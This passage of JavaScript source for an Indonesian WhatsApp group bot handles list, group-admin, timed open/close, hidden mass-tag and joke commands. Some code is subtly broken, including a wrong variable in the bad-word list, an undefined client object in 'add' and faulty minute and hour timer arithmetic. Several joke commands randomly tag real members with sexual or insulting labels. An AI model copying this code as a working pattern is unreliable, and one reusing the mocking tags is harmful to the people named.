client.sendMessage(from, teks.trim(), extendedText, {quoted:fdoc, contextInfo: {"mentionedJid": blocked}})
break 
case 'premiumlist':
case 'listpremium':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
client.updatePresence(from, Presence.composing) 
teks = '*PREMIUM LIST* :\n'
for (let premm of prem) {
teks += `├❏ @${premm.split('@')[0]}\n`
}
teks += `└❏ *Total:* ${prem.length}`
client.sendMessage(from, teks.trim(), extendedText, {quoted:fdoc, contextInfo: {"mentionedJid": prem}})
break 
case 'listbadword':
case 'badwordlist':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
let lbw = `*BAD WORD LIST*\n`
for (let i of bad) {
 lbw += `├❏ ${i.replace(bad)}\n`
}
teks += `└❏ *Total:* ${bad.length}`
client.sendMessage(from, lbw.trim(), extendedText, {quoted:fdoc})
break
case 'liststiker':
case 'liststicker':
case 'liststc':
case 'stikerlist':
case 'stickerlist':
case 'stclist':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
teks = '*Sticker list :*\n\n'
for (let awokwkwk of setiker) {
teks += `├❏ ${awokwkwk}\n`
}
teks += `└❏ *Total : ${setiker.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama sticker_`
client.sendMessage(from, teks.trim(), extendedText, { quoted: fdoc, contextInfo: { "mentionedJid": setiker } })
break
case 'videolist':
case 'listvideo':
case 'listvid':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
teks = '*List Video :*\n\n'
for (let awokwkwk of videonye) {
teks += `├❏ ${awokwkwk}\n`
}
teks += `└❏ *Total : ${videonye.length}* \n\n_Untuk mengambil video silahkan reply pesan ini dengan caption nama video_`
client.sendMessage(from, teks.trim(), extendedText, { quoted: fdoc, contextInfo: { "mentionedJid": videonye } })
break
case 'listimage':
case 'imagelist':
case 'listimg':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
teks = '*List Image :*\n\n'
for (let awokwkwk of imagenye) {
teks += `├❏ ${awokwkwk}\n`
}
teks += `└❏ *Total : ${imagenye.length}* \n\n_Untuk mengambil video silahkan reply pesan ini dengan caption nama image_`
client.sendMessage(from, teks.trim(), extendedText, { quoted: fdoc, contextInfo: { "mentionedJid": imagenye }, thumbnail: Buffer.alloc(0)})
break
case 'listvn':
case 'vnlist':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
teks = '*List Vn:*\n\n'
for (let awokwkwk of audionye) {
teks += `├❏ ${awokwkwk}\n`
}
teks += `└❏ *Total : ${audionye.length}*\n\n_Untuk mengambil vn silahkan reply pesan ini dengan caption nama audio_`
client.sendMessage(from, teks.trim(), extendedText, { quoted: fdoc, contextInfo: { "mentionedJid": audionye } })
break
case 'imunevirtex':
if (!isRegistered) return sendButtonNotRegis(from)  
if (isBanned) return replysticker(banstc) 
sendButtonImageLoc(from, antivirtexx(), support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break
case 'jadibot':
if (!isRegistered) return sendButtonNotRegis(from)  
if (isBanned) return replysticker(banstc) 
sendButtonImageLoc(from, `Mau jadi bot beli jasan run bot ketik aja owner lalu chat, bisa set bot semaumu`, support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break
case 'mystatus':             
case 'status':
case 'mystat':
case 'botstat':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)	
anu = process.uptime()
fkhs = sender
teks = ` *MY STATS*
*${hahh}*  @${player.split("@")[0]}
*TANGGAL :*  ${time}
*WIB :*  ${wib}
*WITA :*  ${wita}
*WIT :*  ${wit}

*Server Name :*  ${client.browserDescription[0]}
*Server :*  ${client.browserDescription[1]}
*Prefix :*  ${prefix}
*Versi Bot :*  ${botver}

*Battery :*  ${battery.persen}
*Charger :*  ${battery.charger == true ? "sedang di cas" : "sedang tidak di cas"}
*Merk HP :*  ${device_manufacturer}
*Versi OS :*  ${os_version}
*RAM :* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
*Versi HP :*  ${device_model}
*MCC :*  ${mcc}
*MNC :*  ${mnc}

*Dev :*  @${dev.split("@")[0]}
*Owner :*  @${ow.split("@")[0]}
*Whatsapp :*  ${wa_version}
*Blockir :*  ${blocked.length} Blocked
*Group Chat :*  ${totalgroup.length} Chat
*Personal Chat :*  ${totalkontak.length} Chat
*Total Chat :*  ${totalchat.length} Chat
*Total User :*  ${_registered.length}
*Hit Today :*  ${luchit} Hit
*Total Hit :*  ${totalhit} chat
*Speed :*  ${latensii.toFixed(4)} Second
*Runtime :*  ${kyun(anu)}

*${banChats ? "SELF" : "PUBLIC"}*`
sendButtonImageLoc(from, teks, support, buttonsmenu2, { quoted: mek, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}})
break
//********** GROUP SETTING *********
case 'banchat':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args[0] === "on") {
if (isMuted) return  replysticker(faktifstc)
mute.push(from)
fs.writeFileSync('./database/group/mute.json', JSON.stringify(mute))
replysticker(successtc)
} else if (args[0] === "off") {
if (!isMuted) return replysticker(faktifstc)
let off = mute.indexOf(from)
mute.splice(off, 1)
fs.writeFileSync('./database/group/mute.json', JSON.stringify(mute))
replysticker(successtc)
} else if (!q){
await sendButtonText(from, `_Pilih Mode Di Bawah Ini_`, support, buttonsmenuonoff, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}
await confirmLIMIT(sender, [angka])
break
case 'antilink':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args[0] === "on") {
if (AntiLink) return  replysticker(faktifstc)
ntilink.push(from)
fs.writeFileSync('./database/group/antilink.json', JSON.stringify(ntilink))
replysticker(successtc)
} else if (args[0] === "off") {
if (!AntiLink) return replysticker(faktifstc)
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
fs.writeFileSync('./database/group/antilink.json', JSON.stringify(ntilink))
replysticker(successtc)
} else if (!q){
await sendButtonText(from, `_Pilih Mode Di Bawah Ini_`, support, buttonsmenuonoff, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}
await confirmLIMIT(sender, [angka])
break
case 'event':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args[0] === 'on') {
if (isEvento) return replysticker(faktifstc)
eventtime.push(from)
fs.writeFileSync('./database/group/eventtime.json', JSON.stringify(eventtime))
replysticker(successtc)
} else if (args[0] === 'off') {
if (!isEvento) return replysticker(faktifstc)
let off = eventtime.indexOf(from)
eventtime.splice(off, 1)
fs.writeFileSync('./database/group/eventtime.json', JSON.stringify(eventtime))
replysticker(successtc)
} else if (!q){
await sendButtonText(from, `_Pilih Mode Di Bawah Ini_`, support, buttonsmenuonoff, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}
await confirmLIMIT(sender, [angka])
break
case 'welcome':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args[0] === 'on') {
if (isWelkom) return replysticker(faktifstc)
welkom.push(from)
fs.writeFileSync('./database/group/welkom.json', JSON.stringify(welkom))
replysticker(successtc)
} else if (args[0] === 'off') {
if (!isWelkom) return replysticker(faktifstc)
let off = welkom.indexOf(from)
welkom.splice(off, 1)
fs.writeFileSync('./database/group/welkom.json', JSON.stringify(welkom))
replysticker(successtc)
} else if (!q){
await sendButtonText(from, `_Pilih Mode Di Bawah Ini_`, support, buttonsmenuonoff, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}
await confirmLIMIT(sender, [angka])
break
case 'antivirtex': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args[0] === 'on') {
if (isAntiVirtex) return replysticker(faktifstc)
antivirtex.push(from)
fs.writeFileSync('./database/group/antivirtex.json', JSON.stringify(antivirtex))
replysticker(successtc)
} else if (args[0] === 'off') {
if (!isAntiVirtex) return replysticker(faktifstc)
let off = antivirtex.indexOf(from)
antivirtex.splice(off, 1)
fs.writeFileSync('./database/group/antivirtex.json', JSON.stringify(antivirtex))
replysticker(successtc)
} else if (!q){
await sendButtonText(from, `_Pilih Mode Di Bawah Ini_`, support, buttonsmenuonoff, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}
await confirmLIMIT(sender, [angka])
break
case 'nobadword': 
case 'antitoxic': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args[0] === 'on') {
if (isBadWord) return replysticker(faktifstc)
badword.push(from)
fs.writeFileSync('./database/group/badword.json', JSON.stringify(badword))
replysticker(successtc)
} else if (args[0] === 'off') {
if (!isBadWord) return replysticker(faktifstc)
let off = badword.indexOf(from)
badword.splice(off, 1)
fs.writeFileSync('./database/group/badword.json', JSON.stringify(badword))
replysticker(successtc)
} else if (!q){
await sendButtonText(from, `_Pilih Mode Di Bawah Ini_`, support, buttonsmenuonoff, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}
await confirmLIMIT(sender, [angka])
break
case 'gc':
case 'group':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args[0] === 'on') {
replysticker(successtc)
client.groupSettingChange(from, GroupSettingChange.messageSend, false)
} else if (args[0] === 'off') {
replysticker(successtc)
client.groupSettingChange(from, GroupSettingChange.messageSend, true)
} else if (!q){
await sendButtonText(from, `_Pilih Mode Di Bawah Ini_`, support, buttonsmenuonoff, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}
await confirmLIMIT(sender, [angka])
break
case 'revoke':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.revokeInvite(from)
replysticker(successtc)
await confirmLIMIT(sender, [angka])
break
case 'promote':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
             if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
             if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
             entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
             if (entah.length > 0) {
             var mems_ids = []
             for (let ids of entah) {
             mems_ids.push(ids)
}
             client.groupMakeAdmin(from, mems_ids)
             } else {
             client.groupMakeAdmin(from, entah)
}
             } else {
             entah = mek.message.extendedTextMessage.contextInfo.participant
             client.groupMakeAdmin(from, [entah])
}
             break
case 'demote':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
             if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
             if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
             entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
             if (entah.length > 0) {
             var mems_ids = []
             for (let ids of entah) {
             mems_ids.push(ids)
}
             client.groupDemoteAdmin(from, mems_ids)
             } else {
             client.groupDemoteAdmin(from, entah)
}
             } else {
             entah = mek.message.extendedTextMessage.contextInfo.participant
             client.groupDemoteAdmin(from, [entah])
}
             break
case 'kick':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
             if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
             if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
             entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
             if (entah.length > 0) {
             var mems_ids = []
             for (let ids of entah) {
             mems_ids.push(ids)
}
             client.groupRemove(from, mems_ids)
             } else {
             client.groupRemove(from, entah)
}
             } else {
             entah = mek.message.extendedTextMessage.contextInfo.participant
             client.groupRemove(from, [entah])
}
             break
case 'add':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
					if (args.length < 1) return reply('Yang mau di add jin ya?')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara mas')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						herman.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Gagal menambahkan target, mungkin karena di private')
					}
					break
case 'creategroup':
			case 'creategrup':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argz = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					client.groupCreate(argz[0], anu)
					reply(`Sukses membuat grup ${argz[0]}`)
                }
				break
case 'listadmin':
case 'adminlist':
case 'admin':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
teks = `*List admin dari ${groupMetadata.subject}*\n*Total: ${groupAdmins.length}*\n\n`
no = 0
for (let admon of groupAdmins) {
no += 1
teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
}
mentions(teks, groupAdmins, true)
await confirmLIMIT(sender, [angka])
break		
case 'groupinfo':   
case 'grupinfo':            
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
replysticker(waitstc)
client.updatePresence(from, Presence.composing)
{
ppUrl = await client.getProfilePicture(from) // leave empty to get your own
buffergbl = await getBuffer(ppUrl)
ppu = await client.prepareMessage(from, buffergbl, image, {thumbnail: Buffer.alloc(0)})
			 let ppugc = ppu.message["ephemeralMessage"] ? ppu.message.ephemeralMessage : ppu

const buttonMessageswsfdt = {
    contentText: `*➣ NAME* : ${groupName}\n*➣ MEMBER* : ${groupMembers.length}\n*➣ ADMIN* : ${groupAdmins.length}\n*➣ DESK*: ${groupDesc}`,
    footerText: support,
    buttons: buttonsmenu2,
    headerType: 6, 
	locationMessage: ppugc.message.locationMessage
}
client.sendMessage(from, buttonMessageswsfdt, MessageType.buttonsMessage, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [numbernye, dev, ow]}})
}
await confirmLIMIT(sender, [angka])
break
case 'listonline':
case 'here':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(client.chats.get(ido).presences), client.user.jid]
client.sendMessage(from, '*List Online:*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
quoted: mek,
contextInfo: { mentionedJid: online }
})
await confirmLIMIT(sender, [angka])
break
case 'linkgrup':
case 'linkgc':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
linkgc = await client.groupInviteCode (from)
yeh = `https://chat.whatsapp.com/${linkgc}\n\n*link Group ${groupName}*`
client.sendMessage(from, yeh, text, {quoted: fgif})
await confirmLIMIT(sender, [angka])
break
case 'setppgrup': 
case 'setppgroup': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
media = await client.downloadAndSaveMediaMessage(mek)
await client.updateProfilePicture (from, media, text, {quoted: mek})
replysticker(successtc)
await confirmLIMIT(sender, [angka])
break	
case 'setnamegrup':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} nama group`)
client.groupUpdateSubject(from, `${q}`)
replysticker(successtc)
await confirmLIMIT(sender, [angka])
break 
case 'setdesc':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} nama desk`)
client.groupUpdateDescription(from, `${q}`)
replysticker(successtc)
await confirmLIMIT(sender, [angka])
break   
case 'tutuptime': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.updatePresence(from, Presence.composing) 
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
client.groupSettingChange (from, GroupSettingChange.messageSend, true);
replysticker(successtc)
}, timer)
await confirmLIMIT(sender, [angka])
break
case 'bukatime': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.updatePresence(from, Presence.composing) 
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
client.groupSettingChange (from, GroupSettingChange.messageSend, false);
replysticker(successtc)
}, timer)
await confirmLIMIT(sender, [angka])
break
case 'leavetime':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isOwner) return replysticker(ownerstc)
client.updatePresence(from, Presence.composing) 
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
client.groupLeave(from);
}, timer)
await confirmLIMIT(sender, [angka])
break
case 'tagall':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isOwner && !isGroupAdmins)return replysticker(adminstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `├❏@${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(teks, members_id, true)
await confirmLIMIT(sender, [angka])
break
case 'hidetag':
case '_`':
case '.':
case 'totag':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isOwner && !isGroupAdmins)return replysticker(adminstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await client.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await client.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: ftroli
}
ini_buffer = fs.readFileSync(file)
client.sendMessage(from, ini_buffer, sticker, options)
fs.unlinkSync(file)
} else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await client.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await client.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: ftroli
}
ini_buffer = fs.readFileSync(file)
client.sendMessage(from, ini_buffer, image, options)
fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await client.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await client.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'audio/mp4',
ptt : true,
contextInfo: { mentionedJid: mem },
quoted: ftroli
}
ini_buffer = fs.readFileSync(file)
client.sendMessage(from, ini_buffer, audio, options)
fs.unlinkSync(file)
}  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await client.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await client.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'video/mp4',
contextInfo: { mentionedJid: mem },
quoted: ftroli
}
ini_buffer = fs.readFileSync(file)
client.sendMessage(from, ini_buffer, video, options)
fs.unlinkSync(file)
} else if (!q){
if (!q) return reply(`reply gambar/sticker/audio/video dengan caption ${prefix}hidetag`)
var group = await client.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var optionshidetag = {
text: q,
contextInfo: { mentionedJid: mem },
quoted: ftroli
}
client.sendMessage(from, optionshidetag, text, { quoted: ftroli})
}
 await confirmLIMIT(sender, [angka])
break
//********** GABUT MENU **********
case 'jadian':
case 'selingkuh':
case 'sahabatan':
case 'ngegay':
case 'lesbian':
case 'musuhan':
case 'pacaran':
case 'kangen':
if (!isRegistered) return sendButtonNotRegis(from)
if (!isGroup) return replysticker(grupstc)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
jds = []
const jdii = groupMembers
const koss = groupMembers
const akuu = jdii[Math.floor(Math.random() * jdii.length)]
const diaa = koss[Math.floor(Math.random() * koss.length)]
teks = `Ciee.. yang lagi ${command} @${akuu.jid.split('@')[0]} sama️ @${diaa.jid.split('@')[0]} `
jds.push(akuu.jid)
jds.push(diaa.jid)
mentions(teks, jds, true, {quoted : mek})
await confirmLIMIT(sender, [angka])
break
case 'pendosa':
case 'tercantik':
case 'terpintar':
case 'cupu':
case 'terbodoh':
case 'terganteng':
case 'wibu':
case 'fakboy':
case 'fakgirl':
case 'jomblo':
case 'sadboy':
case 'sadgirl':
case 'beban':
case 'jodohku':
case 'termalas':
case 'gakguna':
case 'sangean':
case 'bokepers':
if (!isRegistered) return sendButtonNotRegis(from)
if (!isGroup) return replysticker(grupstc)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
jds = []
const jdiidr = groupMembers
const akuutr = jdiidr[Math.floor(Math.random() * jdiidr.length)]
teks = `@${akuutr.jid.split('@')[0]} Dia ${command} di grup ini`
jds.push(akuutr.jid)
mentions(teks, jds, true, {quoted : mek})
const vcardoo = `BEGIN:VCARD\nVERSION:3.0\nFN:${command}\nORG: Paling ${command}\nTEL;type=CELL;type=VOICE;waid=${akuutr.jid.split('@')[0]}:+${akuutr.jid.split('@')[0]}\nEND:VCARD`
client.sendMessage(from, {displayname: "Jeff", vcard: vcardoo}, MessageType.contact, { quoted: fdoc})
await confirmLIMIT(sender, [angka])
break
case 'watak':
if (!isRegistered) return sendButtonNotRegis(from)
if (!isGroup) return replysticker(grupstc)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
watak = body.slice(1)
wa =["penyayang","pemurah","Pemarah","Pemaaf","Penurut","Baik","baperan","Baik Hati","penyabar","Uwu","top deh, pokoknya","Suka Membantu","Supel","Mudah Bergaul","Sombong","Labil","Optimis","Humoris","Kreatif","penyabar","Minder",", Cari Perhatian","Pendendam","Sulit memaafkan","Perfeksionis","Pesimis","Hard to Please"," Terlalu Sensitif","Negative Attitude ","Penyendiri","Moody","Mandiri","Egois","Ambisius","Helper","Kritis","Bossy","Pembangkang","Jujur","Dermawan","Pelit","Keras Kepala","Keras Kepala","Setia","Pendusta","Bijaksana","Tempramental","Berjiwa Besar"]
const tak = wa[Math.floor(Math.random() * wa.length)]
client.sendMessage(from, 'Jawaban : '+ tak, text, { quoted: mek })
 await confirmLIMIT(sender, [angka])
break 
case 'hobby':
if (!isRegistered) return sendButtonNotRegis(from)
if (!isGroup) return replysticker(grupstc)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
